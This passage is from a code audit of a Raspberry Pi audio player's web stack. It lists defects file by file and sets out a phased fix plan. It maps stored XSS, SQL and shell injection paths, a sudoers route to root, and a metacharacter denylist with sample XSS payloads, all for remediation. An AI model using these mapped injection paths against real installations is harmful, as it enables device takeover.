- **M12** `www/command/radio-browser.php:309` — `echo json_encode($response)` emits a bare JSON **string** for `clear_recents`/`clear_caches`/`check_servers` instead of the `{"success":…,"message":…}` object every other branch returns → `resp.success` is `undefined` client-side.
- **M13** `www/command/system.php:29-37` — `restart_local_display` echoes nothing when `$_SESSION['local_display'] != '1'`, leaving a zero-length body where the AJAX caller expects JSON.
- **M14** `www/engine-mpd.php:44, 62` — `$resp` is used at `:62` but only assigned inside the `if` at `:44-59`; when `state` differs, `$resp` is undefined (masked only by `error_reporting(E_ERROR)`). `$_GET['state']` is also never validated.
- **M15** `www/lib-config.php:612-615, 683-686` — `$_SESSION['nvme_src_mpid'] = $_id;` in the `add_nvme_source` branch, but `$_id` is never assigned there (compare the NAS equivalent at `:559`, which correctly uses `''`). The value ends up `NULL`, so the later `remove_nvme_source` builds `WHERE id=''` and deletes nothing.
- **M16** `www/cdsp-config.php:24-57` — `$newMode`/`$currentMode` undefined when a POST carries `save=1` without `cdsp_mode`; `updCDSPConfig()`'s `!=` then evaluates `null != null` → false, silently taking the "switching between configs" branch.
- **M17** `www/sys-config.php:152-176` — no element-count check on `fan_temp0`; `POST fan_temp0=50` leaves `$parts[1]`/`$parts[2]` undefined. The range checks silently pass (`null` compares as 0) and `formatFanTemp0Params()` computes `$params[1] * 1000` on `null`, writing garbage into `/boot/config.txt`.
- **M18** `www/sys-config.php:179-185`, `lib-config.php:230,307`, `dashboard.php:63`, `command/radio.php:257`, `command/index.php:220` — unguarded `explode(…)[1]` / array-index access on values that can be empty. Use `explode(…, ',', 2)` + `?? ''`.
- **M19** `www/eqg-config.php:86`, `www/net-config.php:247,251,258`, `www/blu-config.php:186` — XSS: `sprintf('<option value="%s" …>%s</option>', $_POST['…'], …)`. `net-config.php:258` escapes only the *text*, never the attribute, and since `wlan0ssid` is excluded from validation the value is **persisted** into `cfg_ssid` and re-rendered — stored XSS. `blu-config.php:186` writes Bluetooth device names (attacker-controlled by any paired device) unescaped.
- **M20** `www/inc/common.php:701-783` (`updBootConfigTxt()`, `updDSIScnBrightness()`) — `$value`/`$brightnessValue` concatenated into a double-quoted `sed` word with no `escapeshellarg()`, unlike the purpose-built `sysCmdSed()` helper. Reachable: `snd-config.php:112-115` → `worker.php:3049` → `inc/audio.php:39`, and `per-config.php:220-223` → `worker.php:3830`. Cast brightness to `int`; use `sysCmdSed()`.
- **M21** `www/lib-config.php:121,229,306` and `www/net-config.php:92-117` — SQL built by concatenation (`chkValue()` does not block `'`, `chkSQL()` only blocks `"` and `--`; the INSERTs have no `WHERE`, so `chkSQL()` inspects nothing).
- **M22** `www/command/playback.php:120-137` — `$array` is built inside the `else` branch but returned unconditionally, so a null response returns the *string* `'getPlayHistory(): Response is null'` where the caller expects an array; `json_encode` at `:107` then emits a JSON string.
- **M23** `worker.php` undefined variables: `:1619` `$sockTimeout = … : $timeout;` (`$timeout` is never assigned in worker.php); `:1278` `$statusTx` tested outside the `FEAT_MULTIROOM` block; `:3245` `$cfgMPD['mixer_type']` (out of scope); `:3531` `$GLOBALS['wlan0Ip'][0]` (only assigned inside the "adapter exists" branch); `:4013-4036` `$job` used in log messages but only assigned in a different `case`.

### Front-end — JavaScript
- **M24** `www/js/scripts-library.js:1690` — `encodeHTMLEntities($(this).attr('heading-album'))` double-encodes: `renderSongs()` writes the attribute raw, and the back-end already applied `htmlspecialchars(…, ENT_NOQUOTES)`, so `Rock&Roll` → `Rock&amp;amp;Roll` and never matches. Any album containing `&`, `<` or `>` produces an empty `filteredSongsAlbum`. (The Disc handler at `:1663` correctly omits the call.)
- **M25** `www/js/scripts-library.js:803-808, 817-823` — `heading-album`/`heading-comment`/`heading-key` built with unescaped values; tags are escaped with `ENT_NOQUOTES`, so `"` survives and closes the attribute → attribute injection into `#songsList`.
- **M26** `www/js/scripts-library.js:1139, 1245` — `Math.floor((array[0] / 65535) * filteredAlbums.length)` with `Uint16Array`: `array[0] === 65535` maps to `length` (one past the end) → `filteredAlbums[pos].key` throws `TypeError`, aborting the `.ralbum` click handler. Use `/65536`.
- **M27** `www/js/scripts-library.js:862-883` — `renderSongs()` dereferences `filteredSongs[0]` in the right operand of an `||` that is evaluated even when the filter yields zero songs → `TypeError` leaves `#songsList` stale with no error surfaced.
- **M28** `www/js/playerlib.js:384-387, 505-508` — `GLOBAL.reconnecting` is set `true` and **never reset** (no assignment to `false` anywhere), so after the first MPD error the reconnect notification is permanently suppressed.
- **M29** `www/js/playerlib.js:5237` — `} else if (cols = 7) {` — assignment used as a condition; always truthy, so any remaining column count (e.g. 5) silently gets the 7-column font size and `cols` is mutated.
- **M30** `www/js/scripts-panels.js:1302` — `UI.playlsitPos = -1;` (typo) creates a stray global; `UI.playlistPos` is untouched, so the stale position is written back to `cfg_system` and the view re-scrolls to it. (Compare the correct Radio equivalent at `:1118`.)
- **M31** `www/js/playerlib.js:2408-2409` — duplicate `var countryDiv`; the second declaration overwrites the first for every station, so the **Region** radio sort never displays a country.
- **M32** `www/js/playerlib.js:1012-1019` — `showSSClock()` sets `GLOBAL.ssClockIntervalID` without `clearInterval()` first; only the last ID is kept, so `hideSSClock()` leaves earlier intervals running (they keep writing to `#ss-clock` after CoverView is left, and accumulate on repeated use).
- **M33** `www/js/scripts-panels.js:2012` — the destructive-action confirm compares against `'Discover (rebuild)'`, but the dropdown label is `'Discover (all)'` (`templates/dashboard.html:25`, mapped by `getKeyOrValue()` to `discover_players_rebuild_cache`), so the cache rebuild is submitted on the first click with no confirmation.
- **M34** `www/js/scripts-configs.js:56-57` — `getCSSRule()` returns `undefined` if the rule is absent and throws `SecurityError` on a cross-origin stylesheet; either aborts the enclosing `getJSON` callback **before** `engineMpdLite()`/`engineCmd()` are started at `:84-85`, leaving config pages with no command engine.
- **M35** `www/js/playerlib.js:3113-3121` — queue total time mis-parses tracks ≥ 1 h: `formatSongTime()` emits `H:MM:SS`, so `mmss[0]` (hours) is added to minutes, inflating each long track by 59 minutes.

### Python
- **M36** `www/util/radiocover_plus.py:189-190` — `values.get("LOG_LEVEL").upper()` → `AttributeError` if the key is absent/commented out, `KeyError` on an unknown level. Escapes `read_global()` and kills the CLI that `www/inc/radio.php:14` invokes. Default to `"ERROR"`.
- **M37** `www/util/radiocover_plus.py:987-1009` — `with sqlite3.connect(...)` commits but does **not close** the connection; an uncaught `sqlite3.OperationalError: database is locked` from a concurrent PHP writer propagates out of `main()`, printing a traceback and exiting non-zero with no URL on stdout.
- **M38** `www/util/cdsp_volume_update.py:152-164, 189-190` — `dynamic_range`/`volume_offset` stay `None` when the config file lacks those keys → `TypeError: unsupported operand type(s) for /: 'NoneType' and 'int'`. Reproduced.
- **M39** `www/util/cdsp_volume_update.py:71, 82` — non-atomic read-modify-write of the camilladsp state file: `write_text()` truncates in place, so a concurrent camilladsp reader can observe an empty/partial file. Also `KeyError` if the YAML schema differs.
- **M40** `www/util/rotenc.py:146-150` — a two-row query read **positionally** with no `ORDER BY`: `SELECT value FROM cfg_system WHERE param='volknob' OR param='volume_mpd_max'`, then two `fetchone()` calls. Order depends on table scan; any schema/rowid change silently swaps them, making the knob jump to 100 and the clamp compare against the current value. Look up by name.
- **M41** `www/util/rotenc.py:43, 50` — `len(sys.argv) >= 6` vs `len(sys.argv) == 7`; an 8-arg invocation silently ignores the rest.
- **M42** `www/util/btmeta.py:74-75` and `www/util/aplmeta.py:297-299` — the metadata cache files that PHP reads concurrently (`command/renderer.php get_btmeta`, `get_aplmeta`) are written non-atomically, so a reader can see empty/partial JSON. Write `.tmp` + `os.rename()`.
- **M43** `www/util/btmeta.py:56, 59` — unguarded `subprocess.run()` inside a D-Bus `PropertiesChanged` callback; `FileNotFoundError`/`CalledProcessError` kills the metadata update, and return codes are ignored so a failed `send-fecmd` is invisible.
- **M44** `www/util/bt_pairing_agent.py:100-103, 185` — for `RequestPasskey` (`code == '__input__'`), an accept with no numeric field yields `dbus.UInt32(None)` → `TypeError` inside the io-watch callback. `self.pending` was already popped, so bluez gets no reply and pairing stalls to its own timeout.
- **M45** `www/util/bt_pairing_agent.py:153-159` — `DisplayPasskey` pushes an id never registered in `self.pending`, so there is no timeout source, `_cancel_all()` cannot cancel it, and no `paircancel` is emitted; the modal can only be dismissed by the user.
- **M46** `www/util/gpio_buttons.py:35-37` — `int(row['value'])` with no `None` guard; if the `bounce_time` row is absent, `row` is `None` → `TypeError` at import time and the button daemon dies.
- **M47** `www/util/gpio_buttons.py:58-139` — `subprocess.call(btn_N_cmd)` runs **in the RPi.GPIO event thread** and blocks for the full duration of each button command, so presses on other pins are queued or lost.
- **M48** `www/util/pirev.py:160-169, 222-223` — the old-style revision dict has no `'mem_mb'` key, so `pirev.py -mb 000e` dies with `KeyError: 'mem_mb'`. Reproduced.
- **M49** `www/util/mpdconf_merge.py:90-93` — `/etc/mpd.conf` rewritten in place (`open(filename, 'w')`) while MPD may be reading it; a truncate-then-write window leaves a partial config.
- **M50** `www/util/itunescover.py:47, 54, 57, 65` — no error handling around the HTTP call or the JSON keys; a DNS failure or non-JSON error body raises `KeyError`/`ValueError` and PHP sees a non-zero exit.
- **M51** `www/util/moode_selectactivecdspconfig.py:48-50` — `result.split('|')[2]` raises `IndexError` if the DB query returns nothing, and `check_output` raises on non-zero exit; `:45` `urlopen(req)` has no timeout and no `URLError` handling.
- **M52** `www/util/plexamp_status.py:28` — `requests.get(url)` with **no timeout**; an unreachable Plexamp host blocks the synchronously-invoked script for minutes.
- **M53** `www/util/station_manager.py:388, 404-427, 489` — station **name** is interpolated raw into `WHERE name="…"` (only values go through `escape()`, which doubles `'` and `"`); combined with a broad `except Exception` the station is silently not imported. From an untrusted backup zip this is also SQL injection.
- **M54** `www/util/station_manager.py:393-395` — `os.system('chmod 777 {}/*.jpg'.format(self.radio_logos_path))` interpolates a CLI-supplied path into a shell string; mode 777 is unnecessary.
- **M55** `www/util/station_manager.py:543-546` — `diff_logo()` wraps everything in `except Exception: print(e)` then `return False`, so a missing/unreadable local logo is reported as "identical". `--compare` hides real differences.

### Bash / system
- **M56** `www/util/sysinfo.sh:168` — `echo -e "\nCrossfade\t\t= $mpdcrossfade\c"` uses a variable that is **never assigned anywhere in the tree** (confirmed by grep; the `cfg_mpd` SELECT at `:641-668` does not include `mpdcrossfade`). The Crossfade line in the Audio Config report always prints empty. Add `'mpdcrossfade'` to the param list and assign `${arr[N]}`.
- **M57** `www/util/automount.sh:39` — `grep -w -c $(basename "$2") /etc/exports` is unquoted (SC2046). Verified: a label with a space (`/media/My Music`) word-splits, `grep` treats `Music` as a filename operand, and the count is wrong → duplicate/missed `/etc/exports` lines plus a bogus `sed` append at `:42`.
- **M58** `www/util/plugin-updater.sh:34`, `www/util/system-updater.sh:37` — `cd` without `|| exit` (SC2164). If `cd` fails, `unzip` extracts into the caller's CWD and the following `rm -rf update` deletes a directory by that name in the wrong place.
- **M59** `var/local/www/commandw/qbzevent.sh:60` — `IFS=$'\t' read -r title artist album duration cover_url BITS RATE` breaks when a field is empty. Verified: an empty `cover_url` shifts all subsequent fields (`cover_url=[24] BITS=[44100] RATE=[]`), producing a bogus `cover_url="24"` and `sformat="FLAC 44100/ kHz"` for **any Qobuz track without artwork**. Pass JSON through `jq -c` with a `\x1f`/`\0` delimiter.
- **M60** `qbzevent.sh:145,175`, `spotevent.sh:92,122`, `spspre.sh:59`, `spspost.sh:61` — duplicated `curl` call with **inverted** retry semantics: the identical command is issued twice whenever the first returns non-empty, so every receiver gets the volume command twice on the happy path, and a normal non-empty second response is then logged as "failed".
- **M61** `www/util/sysutil.sh:7,30`, `www/util/sysinfo.sh:511`, `commandw/lcd_updater.py:13` — `HOME_DIR=$(ls /home/)` breaks if `/home` contains more than one directory: `$HOME_DIR` becomes a newline-joined string, and `rm -rf /home/$HOME_DIR/.config/…` at `:30` is unquoted. Use `getent passwd "$(id -un)"` or the `cfg_system.user_id` already read at `common.php:294`.
- **M62** `www/util/resizefs.sh:59, 64-72` — `parted` output parsing with no `set -e` and no numeric validation. Verified: if `parted` fails, `LAST_PART_NUM` is empty, `[ $LAST_PART_NUM -ne $PART_NUM ]` errors, and the script **continues** into the `fdisk` heredoc with garbage geometry. Also the `${ROOT_PART:0:3} = mmc` test fails for NVMe (`/dev/nvme0n1p2`).
- **M63** `www/util/vol.sh:104,118` + `www/util/rotvol.sh:14-16` — `rotvol.sh` has **no** validation on `$1`/`$2` (unlike `vol.sh`'s `$REGEX` check). Verified: `rotvol.sh -xx 10` throws three `arithmetic operand expected` errors and then writes `value=` (empty) into `cfg_system.volknob`. Leading-zero args also break (`$((50 + 08))` → "value too great for base").
- **M64** `vol.sh:118`, `qbzevent.sh:124,155`, `spotevent.sh:71,102`, `slpower.sh:62,78`, `spspre.sh:38`, `spspost.sh:23`, `watchdog.sh:53` — `$(sqlite3 … "UPDATE …")` executes the query's **stdout** as a command (SC2091). Currently harmless because `sqlite3` prints nothing for an UPDATE, but a warning would be executed. Drop the `$( )` wrapper.
- **M65** `www/util/chromium-updater.sh:44-78` — `apt-mark unhold` returns non-zero if any named package is unknown on the current release, aborting the whole downgrade; and the script never re-applies `apt-mark hold` after installing v126, so the next `apt upgrade` silently reverts to stock chromium.
- **M66** `www/util/watchdog.sh:20-25` vs `:100,118,136,154` — inconsistent process probes for the same service: the initial `pgrep -c -f "LC_ALL=C /usr/bin/shairport-sync"` can never match (verified: `sh -c 'LC_ALL=C sleep 300'` has cmdline `sleep 300`), so the watchdog enters the "AirPlay crashed" branch on **every** loop iteration and relies on the inner re-check to save it. If the inner check ever races during a slow start, it fires `moodeutl -R --airplay` and interrupts playback.
- **M67** `etc/avahi/services/moode.service` — advertises `_http._tcp`/80 unconditionally; in HTTPS-only mode clients still attempt plaintext against an HTTPS-only listener. `etc/avahi/services/samba.service` hard-codes `model=Xserve` (an Apple copy-paste) and `_device-info._tcp` with `port=0`.
- **M68** `etc/udev/rules.d/10-a2dp-autoconnect.rules:1-2` — `DEVPATH=="/devices/virtual/input/*"` on `ACTION=="remove"` matches **every** virtual input device removal (touchscreen, GPIO buttons, rotary encoder), not just Bluetooth HID, so unplugging an unrelated input triggers `systemctl stop bluealsa-aplay@$BTMAC` with an empty instance name. `usr/local/bin/a2dp-autoconnect:7-11` compounds this: `sudo` inside a udev `RUN+=` (already root) and an unquoted `$BTMAC`.
- **M69** `www/daemon/lcd-updater.sh:7,11` — `eval` on a hard-coded literal buys nothing, and `inotifywait -e close_write` never fires because `worker.php:2643` writes `currentsong.txt` via `rename()` (which raises `IN_MOVED_TO` on the *directory*). Watch with `-m -e moved_to /var/local/www`.

---

## 6. Low-Severity Findings

- **L1** `www/inc/common.php:132, 170` — `function chkValue($key = 'nokey', $value)` places an optional parameter before a required one. PHP 8.4 emits a deprecation; a single-argument call is a fatal `ArgumentCountError`. Latent (all callers pass two), but fix to `($key, $value)`.
- **L2** `www/inc/cdsp.php:42, 57` — dynamic property `CamillaDsp::$device` is deprecated on PHP 8.2+ (raised on every instantiation from `inc/audio.php:265`, `snd-config.php:19`, …). Declare `private $device = null;`. This also hides that `$this->cardNum` is assigned but never read.
- **L3** `www/util/pirev.py:222` — `-a/--all` omits `mem_mb` (every other field is `… or args.all`); `:192,204` `int()` conversions have no `ValueError` handling.
- **L4** `www/util/radiocover_plus.py:447-452` — the `archive.org` resolution fallback sits **after** a `return`, so it is unreachable and those URLs are scored 0 and discarded. `:494` compares `resultCount` against the string `'0'` when the API returns an int. `:459-477` never closes `stream=True` responses.
- **L5** `www/util/aplmeta.py:175, 242` — inconsistent unknown-line filter: `'XXX Could not recognize'` still reaches `update_globals()` though both alternatives mean "value omitted". `:280` uses `shell=True` for a constant command. `:173` traps only SIGTERM, orphaning the cover-lookup child on SIGINT/SIGHUP.
- **L6** `www/util/bt_pairing_agent.py:55-61` — `Popen` never reaped (zombie `php` accumulation); `:42-43` derives the registered D-Bus `CAPABILITY` from *any* argv[1], so a stray systemd `ExecStart` argument silently degrades pairing to Just Works / NoInputNoOutput.
- **L7** `www/util/station_manager.py:529, 534, 539` — `diff_logo()` leaks three `open()` handles. `:343-349` sets `return_code = 3` on a missing PLS directory but never returns or checks it, so the import continues writing into a non-existent path.
- **L8** `www/util/rotenc.py:98, 116` — `global` declarations that are never assigned; `:165` SQL built by concatenation (safe only because `new_volume` is an int).
- **L9** `www/util/gpio_buttons.py:142-143` — no SIGTERM handling (killed without unwinding); `row['command'].split(',')` raises `AttributeError` if `command` is NULL.
- **L10** `www/util/moode_selectactivecdspconfig.py:15` — convoluted/duplicated argv validation; `len(sys.argv) >= 4` rejects a valid 3-arg form with a generic error. `www/util/camillaplot_pipeline.py:18-23` — unchecked `argv[1]`, leaked file handle, unhandled `BrokenPipeError`.
- **L11** `commandw/lcd_updater.py:13-15` — `ls /home/` output concatenated into a path; multiple home directories produce a nonexistent target and a `FileNotFoundError` traceback in the LCD daemon.
- **L12** `www/util/start-xinput.sh:14` — empty `$1` produces `ambiguous redirect` and `xinput` never starts (verified). `www/util/sysutil.sh:10,27` — `[ -z $1 ]` / `[ $2 = "host" ]` emit `unary operator expected` and fall through with empty `$3`/`$4`, running `sed -i "s// /" /etc/hostname`-style substitutions.
- **L13** `www/util/sysutil.sh:224-227` — `dpkg -l | grep nano | awk '{print $4}'` reads the **version** field, not the arch, and matches any package containing "nano"; `-lt` on a possibly-empty value. Use `dpkg --print-architecture`.
- **L14** `www/js/scripts-panels.js:315` — `SESSION.json['updater_available_update'] + 'This notification…'` with no separator. `www/js/playerlib.js:1672` — `html = …` missing `var` (leaks a global). `:1109` — `SESSION.json['volmute'] == '1';` is a no-op statement, likely a lost conditional. `:2120` — stray `;` inside an `output +=` expression.
- **L15** `www/js/scripts-panels.js:1170, 1342, 1713, 1745` and `radio-browser.js:185` — `new RegExp(filter, 'i')` on raw user input: a filter containing regex metacharacters (e.g. `[`) throws `SyntaxError` inside the debounced `setTimeout`, silently breaking search. Escape with `.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')`.
- **L16** `www/js/osk.js:448-452` — on-screen keyboard handlers are bound only to inputs present at `initializeOSK()`; inputs injected later via `.load()` (audioinfo, import-playlist) never open the keyboard. Use delegated focus handlers.
- **L17** `www/js/links.js:18` — `this.className.includes(…)` throws for anchors wrapping inline SVG, where `className` is an `SVGAnimatedString`.
- **L18** `lib/systemd/system/rotenc.service:16` — `ExecStart=/var/www/daemon/rotenc.py` with **no** `/usr/bin/python3` prefix, and `gulpfile.js:552-553` chmods only `/var/www/command/*` and `/var/www/util/*` — **not** `/var/www/daemon/*`. The script is committed mode 100644, so `ExecStart` fails with `203/EXEC`. Same for `www/util/gen-cert.sh` (invoked directly at `worker.php:1359`).
- **L19** `lib/systemd/system/localdisplay.service` — no `Restart=`/`RestartSec=`, so a crashed X leaves the display permanently down; `User=pi` is patched at runtime by `worker.php:1388` with no verification. `shellinabox.service` likewise has no `Restart=`.
- **L20** `etc/nginx/moode-locations.conf:19-24` — the `\.php$` location has no `try_files $uri =404;`. `etc/nginx/fastcgi_params.overwrite:9-10` duplicates `fastcgi_param REQUEST_SCHEME` and omits the stock `HTTP_PROXY ""` (httpoxy) and `PATH_INFO` lines. `moode-https.overwrite.conf:3-8` binds only `[::1]:80`, so a browser resolving `localhost` to `127.0.0.1` gets a 301 even for loopback.

---

## 7. Remediation Plan

The plan is sequenced so that each phase reduces the blast radius of the next. Effort estimates assume one engineer familiar with the codebase.

### Phase 0 — Emergency containment (0.5 day)

Goal: cut off the trivial root-compromise path while the code fixes land.

| Action | Files |
|---|---|
| Replace `NOPASSWD: ALL` with a `Cmnd_Alias` allowlist | `etc/sudoers.d/010_www-data-nopasswd` |
| Remove `Defaults:root !logfile, !syslog` / `Defaults:www-data …` | `etc/sudoers.d/010_moode` |
| Reject `POST`/cross-origin requests to `cmd=reboot\|poweroff\|update_library` | `www/command/system.php:16-24` |
| Add a key whitelist to the `cfg_system` write loop | `www/command/cfg-table.php:136-138` |
| `basename()` + `^[A-Za-z0-9._-]+\.ya?ml$` on the upload filename | `www/cdsp-config.php:104-106` |

*Exit criteria:* an arbitrary POST can no longer yield root directly.

### Phase 1 — Fix the systemic escape defect (2–3 days)

Everything in §3.2, §3.10, §3.11 and H1, H5, H14, H19, H20, H24, H29, M20 hangs off this.

| Action | Files |
|---|---|
| Extend the `chkValue()` denylist with `" ' & \r \n \0 ( ) * #` | `www/inc/common.php:132-170` |
| Remove the `chkVariables()` exclusion lists; replace with per-field whitelists | `playlist.php:15-16`, `music-library.php:17`, `sys-config.php:22`, `audioinfo.php:14`, `net-config.php:15` |
| Migrate hand-rolled `"…"` quoting to `escapeshellarg()` / `sysCmdSed()` | ~30 sites listed in §3.2, H1, H19, H20, M20 |
| Enumeration validation for command-shaped params (`btcmd`, `cpugov`, `cdspconfig`, `rotenc_params`) | `blu-config.php`, `sys-config.php`, `command/camilla.php`, `per-config.php` |
| `intval()` the numeric params and strip `\r\n` from all MPD command args | `command/playback.php`, `command/queue.php`, `command/audioinfo.php`, `eqg-config.php`, `eqp-config.php` |

*Exit criteria:* a fuzz sweep over every POST/GET parameter finds no shell metacharacter reaching a command position.

### Phase 2 — Parameterise SQL (2 days)

| Action | Files |
|---|---|
| Convert `sqlRead()` to prepared statements with bound parameters | `www/inc/sql.php:19-41` |
| Replace the ~20 raw concatenations with `sqlUpdate()`/`SQLite3::escapeString()` | `command/radio.php` (both INSERT and UPDATE, and the missing `else` at `:279-290`), `trx-config.php`, `net-config.php`, `inc/eqp.php`, `inc/autocfg.php`, `lib-config.php`, `command/playlist.php:487,492` |
| Add `chkKey()` whitelists where they are missing | `mpd-config.php:27`, `gpio-config.php:19-25` |
| Add a final `else` to `putRadioViewShowHide()` | `command/radio.php:279-290` |

*Exit criteria:* no SQL string is built from request data without escaping or binding.

### Phase 3 — Output encoding and CSRF (2 days)

| Action | Files |
|---|---|
| `htmlspecialchars()` on all reflected/stored output | `header.php:164`, `common.php:uiNotify`, `eqg-config.php:86`, `net-config.php:247-258`, `blu-config.php:186`, `dashboard.php:97-101` |
| Replace `sysCmd("echo -n '" . $_players . "' \| sudo tee …")` with `file_put_contents()` | `dashboard.php:137` |
| `rbEscapeHtml()` / `encodeHTMLEntities()` at every `.html()` concat of radio, playlist, renderer metadata and radio-browser.genre data | `playerlib.js:2455-2466, 2567-2570, 927-961`, `radio-browser.js:314-326`, `scripts-library.js:803-823` |
| Introduce a CSRF token checked on all state-changing POSTs; start with `*/command/*.php` and `cmd-table` writes | all `command/*.php`, all `*-config.php` |

*Exit criteria:* a stored `<script>` / `" onerror=` payload in any DB-backed field renders inert.

### Phase 4 — Crash and logic fixes (2 days)

The daemon-crash and silently-disabled-feature class. All are small, isolated, and independently verifiable.

| Fix | Files |
|---|---|
| `audiout` → `audioout` | `inc/mpd.php:676` |
| Add `== '0'` to `paactive` | `worker.php:2247` |
| `==` → `=` for the two session defaults | `worker.php:464, 1531` |
| `$file` → the actual path in `create_saved_search` | `worker.php:2955` |
| Add `else`/`return` after failed `openMpdSock()` | `worker.php:1849, 940, 975`; `music-library.php:960` |
| Open `$sock` before `turnOffAutoShuffle()` | `command/index.php:78-81` |
| `file(…) ?: array()` before `count()`; `socket_close()` on connect failure | `common.php:517-535` |
| `$result[0]['value']` | `alsa.php:238` |
| `unset($ymlCfg['pipeline'])` | `cdsp.php:89` |
| `except sqlite3.Error`; guard `self.conn`; move `ZipFile` into `else` | `station_manager.py:89, 116, 126-134` |
| Swap the two diff sets | `station_manager.py:606-614` |
| `self.update_cdsp_statefile(...)` | `cdsp_volume_update.py:49, 54` |
| `raise` at both `InvalidLine` sites; derive from `Exception`; atomic write | `mpdconf_merge.py:86, 123, 25, 90` |
| `if line == '': break` in the stdin loop | `aplmeta.py:235` |
| Move the publish block out of the `else` | `aplmeta.py:269-314` |
| `title = "H:MM:SS"` hours handling | `playerlib.js:3113-3121` |
| Add `mpdcrossfade` to the `cfg_mpd` SELECT | `sysinfo.sh:641-668, 168` |

### Phase 5 — Reliability and hardening (3–4 days)

| Area | Action |
|---|---|
| Update logic | Replace `killall <script>.php` with a PID file / `pkill -f -x` (`moodeutl:456-462`) |
| Update security | SHA-256 verification before `unzip` + `install.sh` (`system-updater.sh`, `plugin-updater.sh`) |
| Temp files | `mktemp` + `trap … EXIT` in `gen-cert.sh`, `backup_manager.py`, `station_manager.py` |
| Daemon robustness | Wrap the MPD client in `try/except` in `rotenc.py`; narrow `thread_lock`; `Popen` instead of `call` in `gpio_buttons.py`; `try/except` in `btmeta.py` |
| Atomic writes | `write_text`/file writes → `tmp` + `os.replace()` for every cache file read by PHP (`aplmeta.py`, `btmeta.py`, `radiocover_plus.py`, `cdsp_volume_update.py`, `worker.php` currentsong) |
| Engine loops | Wrap `engineMpd`/`engineCmd`/`engineMpdLite` bodies in `try/catch` with the re-arm in `finally`; fix the reconnect predicate and reset `GLOBAL.reconnecting` |
| Library JS | `heading-mb-album-id` → `heading-key`; drop the double `encodeHTMLEntities`; `/65536`; empty-list guard in `renderSongs()` |
| Shell | `cd … \|\| exit`; quote the `automount.sh` basename; `rotvol.sh` arg validation; drop `$(sqlite3 …)`; consistent `pgrep -x`; `set -euo pipefail` in `resizefs.sh`; `clearInterval` before `setInterval` |
| Systemd/nginx | Add `/var/www/daemon/*` to the `gulpfile.js` chmod list (or add a `python3` prefix to `ExecStart`); `Restart=on-failure`; `try_files $uri =404;`; `REQUEST_SCHEME` dedupe + `HTTP_PROXY ""` |
| PHP 8.4 | `chkValue($key, $value)`; declare `CamillaDsp::$device` |

### Phase 6 — Regression prevention (ongoing)

Add to CI (`.github/workflows/` already exists):

1. `php -l` across `www/**.php` (391 files) — currently fails on two bundled Zend files (§8).
2. `python3 -m pyflakes` — gate on new findings; existing unused-import noise can be baselined.
3. `shellcheck -S error` with a ratchet on the warning count.
4. A **convention test** asserting that the session key set written by each `*-config.php` matches the set read by `inc/*.php` and by `playerlib.js`. Four of the highest-value findings (§3.3, H25, H35, and the `snd-config.php:315` double-underscore typo below) are exactly this class and are trivially caught by such a check.
5. A **grep gate** rejecting new `sysCmd('… "' . $_POST` / `$_GET` / `$row[` patterns, and new `" . $value . "` inside SQL strings — forcing new code through `escapeshellarg()` / prepared statements.

### Follow-up: the `snd-config.php:315` double-underscore typo

Found during verification of §3.3 and worth its own item — the same feature commit has a **second** typo that silently defeats the change-detection guard:
```php
if (isset($_POST['update_mpd_httpd_local_audio']) && $_POST['mpd_httpd__local_audio'] != $_SESSION['mpd_httpd_local_audio']) {
```
The template posts `name="mpd_httpd_local_audio"` (`templates/snd-config.html:437-438`), but the guard reads `mpd_httpd__local_audio` (double underscore). The comparison is always `null != <value>` → always true, so the job is submitted on **every** POST to `snd-config.php` rather than only on change. Fix: `$value = $_POST['mpd_httpd_local_audio']; if ($value != $_SESSION['mpd_httpd_local_audio']) { … }`.

---

## 8. Out of Scope / Not Defects

- **Bundled Zend Framework (`www/inc/Zend/Media/Mpeg/`)** — two files fail `php -l` on PHP 8.4:
  - `Object.php:144` — syntax error (curly-brace interpolation).
  - `Abs/VbriHeader.php:88` — `Unparenthesized a ? b : c ? d : e is not supported`.

  These are upstream third-party files. `php -l` failures here are pre-existing vendoring debt and were **not** counted in the finding totals. They should be upgraded or replaced, but they are not defects introduced by this codebase. (Note they *are* latent fatals if that code path is ever reached on PHP 8.4.)
- **`SHL_CMDS = array('base64')`** — a single-element list, apparently a work in progress rather than a bug. Flagged as an observation: the denylist's coverage depends entirely on this array, so it deserves a deliberate review rather than being left at one entry.
- **Vendored front-end libraries** (`jquery-1.8.2.js`, `bootstrap.js`, `jquery-ui/`) — excluded from review. `moode_application.md` §Maintenance already tracks their upgrade as low-priority.
- **Design-level items** raised in `moode_application.md` (library/JS refactoring, Bootstrap/jQuery bumps) — architectural debt, not defects, and explicitly deprioritised by the project itself.

---

## 9. Finding Index

| Severity | IDs | Count |
|---|---|---|
| **Critical** | §3.1–§3.12 | 12 |
| **High** | H1–H44 | 44 |
| **Medium** | M1–M69 | 69 |
| **Low** | L1–L20 | 20 |

*(Totals exceed the 86 headline figure where a single finding spans multiple files/languages; the executive-summary count of 86 distinct defects is the deduplicated figure.)*

### Quick-reference: highest value-per-effort fixes

| Rank | Fix | Effort | Why first |
|---|---|---|---|
| 1 | `etc/sudoers.d/*` — allowlist + logging | 1 h | Converts every injection from *root* into *www-data*; enables detection |
| 2 | `chkValue()` denylist + remove exclusion lists | 2 h | Kills ~17 injection sites at one choke point |
| 3 | `cdsp_volume_update.py` `cdsp` → `self` | 5 min | One-token fix; restores all volume updates |
| 4 | `mpdconf_merge.py` add `raise` ×2 | 5 min | Stops silent config corruption of `/etc/mpd.conf` |
| 5 | `aplmeta.py` EOF break | 5 min | Stops a 100% CPU spin |
| 6 | `worker.php` `paactive == '0'`, `==` → `=` ×2 | 15 min | Restores RoonBridge + LCD updater + Ethernet timeout |
| 7 | `inc/mpd.php` `audiout` → `audioout` | 1 min | Restores a shipping feature |
| 8 | `moodeutl` `killall` → PID file | 1 h | Stops duplicate-worker races on every restart |
| 9 | `station_manager.py` 3 fixes | 30 min | Restores all error paths + correct diff semantics |
| 10 | `worker.php:1849` `else` / `exit` | 15 min | Stops the daemon from dying before the UI comes up |